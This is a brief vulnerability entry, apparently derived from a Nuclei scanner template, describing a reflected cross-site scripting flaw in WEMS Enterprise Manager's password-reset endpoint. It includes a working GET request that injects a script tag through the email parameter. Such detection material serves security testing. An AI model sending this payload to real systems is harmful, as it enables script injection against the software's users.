# Vulnerability: WEMS Enterprise Manager - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wems-manager-xss.yaml`)

## Description
WEMS Enterprise Manager contains a cross-site scripting vulnerability via the /guest/users/forgotten endpoint and the email parameter, which allows a remote attacker to inject arbitrary JavaScript into the response return by the server.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
```

